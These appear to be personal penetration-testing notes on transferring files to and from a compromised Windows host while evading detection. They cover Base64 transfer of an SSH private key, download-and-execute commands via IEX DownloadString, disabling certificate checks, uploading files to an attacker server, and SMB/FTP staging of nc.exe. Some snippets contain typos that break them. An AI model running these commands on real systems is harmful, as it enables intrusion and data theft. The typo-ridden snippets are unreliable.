```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
Sometimes to bypass defences and detection mechanisms, we need to use various methods (sometimes in-conjunction with one another) to transfer files to/from a target system.

## PowerShell Base64 Encode & Decode
- We can encode a payload as Base64, copy and paste it to the other system (eg. via a terminal), and decode it on the system
- Doesn't require any network communication to transfer the file (only shell connection)
- It is important to check the hash of the payload on both sides to ensure its transferred correctly (eg. MD5)
- *CMD is limited to 8191 characters, so this will not work for larger files*

**Example transferring an SSH key**
1. Check hash of key : `md5sum id_rsa`
2. Encode key : `cat id_rsa | base64; echo`
3. Copy contents to target machine
4. Use PowerShell to decode : `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64_string>"))`
5. Confirm hash : `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5`

The same Base64 techniques can be used to upload files to a web server
```PowerShell
$b64 = [System.convert]::ToBase64S=tring((Get-Content -Path '<File Path>' -Encoding Byte))
Invoke-WebRequest -Uri '<Webserver Address>' -Method POST -Body $b64
```

We can listen on a port with `nc` to catch the incoming request and the data.
```bash
nc -lvnp 4444
```

## PowerShell Web Downloads
- Most companies allow *HTTP* and *HTTPS* traffic through the firewall.
- Web filtering could still prevent access to certain websites, or block certain file type downloads etc
- The [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over *HTTP* (80), *HTTPS* (443), or *FTP* (21). The methods can be seen below:

| Method                                                                                                                   | Description                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |
```Powershell
# Download a file
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Location>')

# Fileless download (Doesn't write to disk, executes directly from memory using Invoke-Expression [IEX])
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX

# PowerShell 3.0+ can use Invoke-WebRequest (Alias: iwr, curl, wget)
Invoke-WebRequest '<Target File URL>' -OutFile '<Output File Location>'
# -UseBasicParsing can be used if there are IE engine problems

# If there is issues related to SSL/TLS certs not being trusted
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
[More Examples](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

## PowerShell Web Uploads
- PowerShell has no upload function by default but `Invoke-WebRequest` & `Invoke-RestMethod` can be used to build our upload function.
- We will also need a webserver capable of accepting file uploads.

First, create a webserver that is capable of handling file uploads. `uploadserver` is a python HTTP.server module extension for uploads.
```bash
pip3 install uploadserver

python3 -m uploadserver
```

We can then use a tool like [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) which uses `Invoke-RestMethod` to perform upload operations in PowerShell.
```PowerShell
IEX(New-Obeject Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri 'http://<ip>/upload' -File '<File Path>'
```
## SMB Downloads
SMB works on TCP port 445, and can be used to transfer files to a target system.

First we need to create an SMB server to host our payload (we can use Impacket's `smbserver`)
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

We can then copy the file to our target system
```cmd
copy \\<ip>\share\nc.exe
```
> Sometimes this will be blocked by modern windows systems as guest authentication is disabled. To fix this we can create an SMB server with a username and password.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

On the target system, mount and then copy the file
```cmd
net use n: \\<ip>\share /user:test test
copy n:\nc.exe
```

## FTP Downloads
Another alternative is to use port 20/21 for FTP file downloads.

We can use `pyftpdlib` (a python ftp server library) to create an FTP server. By default it uses port *2121* so we can change this. It also has anonymous auth enabled by default too.
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

We can then download it via PowerShell on the target
```PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', '<Output File Location')
```